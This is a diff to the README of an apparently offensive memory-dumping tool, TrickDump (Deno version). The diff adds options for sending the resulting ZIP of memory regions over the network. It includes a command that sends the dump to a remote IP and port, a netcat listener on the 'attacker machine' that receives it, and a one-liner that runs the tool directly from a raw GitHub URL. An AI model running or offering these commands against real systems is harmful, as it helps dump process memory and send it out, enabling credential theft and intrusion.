@@ -52,13 +52,25 @@ python3 create_dump.py [-l LOCK_JSON] [-s SHOCK_JSON] [-b BARREL_JSON] [-z BARRE
 If you prefer to execute only one script, trick.js generates a ZIP file containing the 3 JSON files and the ZIP file with the memory regions:
 
 ```
-deno run --allow-ffi --allow-write trick.js [-o OPTION] [-p PATH]
+deno run --allow-ffi --allow-write --allow-net trick.js [-o OPTION] [-p PATH] [-i IP] [-P PORT]
 ```
 
 Or run it directly from the repo:
 
 ```
-deno run --allow-ffi --allow-write https://raw.githubusercontent.com/ricardojoserf/TrickDump/deno-flavour/trick.js
+deno run --allow-ffi --allow-write --allow-net https://raw.githubusercontent.com/ricardojoserf/TrickDump/deno-flavour/trick.js
+```
+
+You can send the ZIP file to a remote machine instead of writing to disk using the *-i* and *-P* parameters:
+
+```
+deno run --allow-ffi --allow-net trick.js -i 192.168.1.100 -P 1234
+```
+
+Receive it on the attacker machine:
+
+```
+nc -lvnp 1234 > trick.zip
 ```
 
 You get a ZIP file (trick.zip), and you can create the Minidump file with the *create_dump.py* script using the *-t* flag:
